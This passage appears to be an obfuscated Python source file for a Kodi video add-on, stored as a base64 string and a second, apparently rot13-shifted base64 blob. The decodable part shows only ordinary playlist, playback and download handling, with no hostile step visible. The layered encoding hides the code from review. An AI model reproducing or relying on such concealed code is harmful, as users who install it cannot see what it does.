AgICAgICAgICAgIGlmIGluZGV4ID49IDA6DQogICAgICAgICAgICAgICAgaWYgIiZtb2RlPTE5IiBpbiBtdV9wbGF5bGlzdFtpbmRleF06DQogICAgICAgICAgICAgICAgICAgICNwbGF5c2V0cmVzb2x2ZWQgKHVybHNvbHZlcihtdV9wbGF5bGlzdFtpbmRleF0ucmVwbGFjZSgnJm1vZGU9MTknLCcnKSksbmFtZSxpY29uaW1hZ2UsVHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgeGJtYy5QbGF5ZXIoKS5wbGF5KHVybHNvbHZlcihtdV9wbGF5bGlzdFtpbmRleF0ucmVwbGFjZSgnJm1vZGU9MTknLCcnKS5yZXBsYWNlKCc7JywnJykpKQ0KICAgICAgICAgICAgICAgIGVsaWYgIiRkb3JlZ2V4IiBpbiBtdV9wbGF5bGlzdFtpbmRleF0gOg0KIyAgICAgICAgICAgICAgICAgICAgcHJpbnQgbXVfcGxheWxpc3RbaW5kZXhdDQogICAgICAgICAgICAgICAgICAgIHNlcGF0ZSA9IG11X3BsYXlsaXN0W2luZGV4XS5zcGxpdCgnJnJlZ2V4cz0nKQ0KIyAgICAgICAgICAgICAgICAgICAgcHJpbnQgc2VwYXRlDQogICAgICAgICAgICAgICAgICAgIHVybCxzZXRyZXNvbHZlZCA9IGdldFJlZ2V4UGFyc2VkKHNlcGF0ZVsxXSwgc2VwYXRlWzBdKQ0KICAgICAgICAgICAgICAgICAgICB1cmwyID0gdXJsLnJlcGxhY2UoJzsnLCcnKQ0KICAgICAgICAgICAgICAgICAgICB4Ym1jLlBsYXllcigpLnBsYXkodXJsMikNCg0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIHVybCA9IG11X3BsYXlsaXN0W2luZGV4XQ0KICAgICAgICAgICAgICAgICAgICB4Ym1jLlBsYXllcigpLnBsYXkodXJsKQ0KICAgICAgICBlbGlmIG5vdCBxdWV1ZVZpZGVvOg0KICAgICAgICAgICAgI3BsYXlsaXN0ID0geGJtYy5QbGF5TGlzdCgxKSAjIDEgbWVhbnMgdmlkZW8NCiAgICAgICAgICAgIHBsYXlsaXN0LmNsZWFyKCkNCiAgICAgICAgICAgIGl0ZW0gPSAwDQogICAgICAgICAgICBmb3IgaSBpbiBtdV9wbGF5bGlzdDoNCiAgICAgICAgICAgICAgICBpdGVtICs9IDENCiAgICAgICAgICAgICAgICBpbmZvID0geGJtY2d1aS5MaXN0SXRlbSgnJXMpICVzJyAlKHN0cihpdGVtKSxuYW1lKSkNCiAgICAgICAgICAgICAgICAjIERvbid0IGRvIHRoaXMgYXMgcmVnZXggcGFyc2VkIG1pZ2h0IHRha2UgbG9uZ2VyDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBpZiAiJGRvcmVnZXgiIGluIGk6DQogICAgICAgICAgICAgICAgICAgICAgICBzZXBhdGUgPSBpLnNwbGl0KCcmcmVnZXhzPScpDQojICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgc2VwYXRlDQogICAgICAgICAgICAgICAgICAgICAgICB1cmwsc2V0cmVzb2x2ZWQgPSBnZXRSZWdleFBhcnNlZChzZXBhdGVbMV0sIHNlcGF0ZVswXSkNCiAgICAgICAgICAgICAgICAgICAgZWxpZiAiJm1vZGU9MTkiIGluIGk6DQogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSB1cmxzb2x2ZXIoaS5yZXBsYWNlKCcmbW9kZT0xOScsJycpLnJlcGxhY2UoJzsnLCcnKSkgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgdXJsOg0KICAgICAgICAgICAgICAgICAgICAgICAgcGxheWxpc3QuYWRkKHVybCwgaW5mbykNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgICAgICAgICAgICAgcGxheWxpc3QuYWRkKGksIGluZm8pDQogICAgICAgICAgICAgICAgICAgIHBhc3MgI3hibWMuUGxheWVyKCkucGxheSh1cmwpDQoNCiAgICAgICAgICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oJ3BsYXlsaXN0LnBsYXlvZmZzZXQodmlkZW8sMCknKQ0KICAgICAgICBlbHNlOg0KDQogICAgICAgICAgICAgICAgbGlzdGl0ZW0gPSB4Ym1jZ3VpLkxpc3RJdGVtKG5hbWUpDQogICAgICAgICAgICAgICAgcGxheWxpc3QuYWRkKG11X3BsYXlsaXN0LCBsaXN0aXRlbSkNCg0KDQpkZWYgZG93bmxvYWRfZmlsZShuYW1lLCB1cmwpOg0KICAgICAgICANCiAgICAgICAgaWYgYWRkb24uZ2V0U2V0dGluZygnc2F2ZV9sb2NhdGlvbicpID09ICIiOg0KICAgICAgICAgICAgeGJtYy5leGVjdXRlYnVpbHRpbigiWEJNQy5Ob3RpZmljYXRpb24oJ0Nob29zZSBhIGxvY2F0aW9uIHRvIHNhdmUgZmlsZXMuJywxNTAwMCwiK2ljb24rIikiKQ0KICAgICAgICAgICAgYWRkb24ub3BlblNldHRpbmdzKCkNCiAgICAgICAgcGFyYW1zID0geyd1cmwnOiB1cmwsICdkb3dubG9hZF9wYXRoJzogYWRkb24uZ2V0U2V0dGluZygnc2F2ZV9sb2NhdGlvbicpfQ0KICAgICAgICBkb3dubG9hZGVyLmRvd25sb2FkKG5hbWUsIHBhcmFtcykNCiAgICAgICAgZGlhbG9nID0geGJtY2d1aS5EaWFsb2coKQ0KICAgICAgICByZXQgPSBkaWFsb2cueWVzbm8oJ3RlYW0ubWlsaGFub3MnLCAnRG8geW91IHdhbnQgdG8gYWRkIHRoaXMgZmlsZSBhcyBhIHNvdXJjZT8nKQ0KICAgICAgICBpZiByZXQ6DQogI'
destiny = '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